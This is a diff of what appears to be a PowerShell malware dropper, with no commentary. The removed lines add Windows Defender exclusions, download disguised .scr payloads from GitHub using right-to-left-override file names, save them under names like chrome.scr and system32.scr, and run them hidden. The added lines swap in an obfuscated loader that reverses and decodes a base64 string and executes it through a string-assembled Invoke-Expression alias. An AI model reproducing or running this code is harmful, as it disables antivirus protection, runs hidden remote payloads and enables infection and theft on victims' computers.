@@ -1,15 +1,4 @@
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".src"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".avi"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
-
-
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/spoofed/raw/main/C-Grabber%E2%80%AEiva.scr -o C:\Users\Public\chrome.scr
-powershell.exe -w Hidden C:\Users\Public\chrome.scr
-
-powershell -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/X%E2%80%AEiva.scr -o C:\Users\Public\jre.scr
-powershell.exe C:\Users\Public\jre.scr
-
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/spoofed/raw/main/board%E2%80%AEiva.scr -o C:\Users\Public\system32.scr
-powershell.exe -w Hidden C:\Users\Public\system32.scr
+$best64code = "K0gI7kyJxMHcuUmZhN3LulWYt9CdjVmavJHcvcDNlNmcvZmclJWej9SbvNmL05WZ052bjJXZzVnY1hGdpdmL3Fmcv8iOzBHd0h2JocmbpJHdTRWYvxmb39GRukCduVWasNkYldlL0VmTgQ3YlpmYP1ydl5EKYVUSiAyQtAiblRGZphEIlxWe0N3dvRmbpdVLgUGel5CbsVGazJXZ39Gc" ;
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
+$lOaDcOde = [SYsTem.teXt.eNCoDING]::uTF8.GEtSTRINg([SYsTEM.COnVeRt]::fRomBaSE64StrinG("$BASE64")) ;
+$pWN = "I"+"N"+"v"+"o"+"k"+"E"+"-"+"e"+"X"+"p"+"r"+"E"+"S"+"s"+"I"+"O"+"N" ; new-AlIas -namE PWn -VAlUe $pwN -FoRcE ; PWN $loADcoDE ;
